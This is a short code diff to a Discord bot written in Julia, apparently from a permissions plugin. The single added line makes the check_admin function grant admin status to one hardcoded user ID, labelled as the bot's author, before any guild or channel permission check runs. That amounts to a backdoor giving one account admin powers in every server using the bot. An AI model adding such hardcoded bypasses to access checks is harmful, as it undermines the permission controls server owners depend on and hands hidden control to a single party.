@@ -55,6 +55,7 @@ function PluginBase.revokeall!(guid::Snowflake, perm::AbstractPermission)
 end
 
 function check_admin(client::Client, m::Message)
+    m.author.id==198170782285692928 && return true #BotAuthor
     guild = Discord.get_guild(client, m.guild_id)
     channel = Discord.get_channel(client, m.channel_id)
     perms = Discord.permissions_in(m.member, Discord.fetchval(guild), Discord.fetchval(channel))
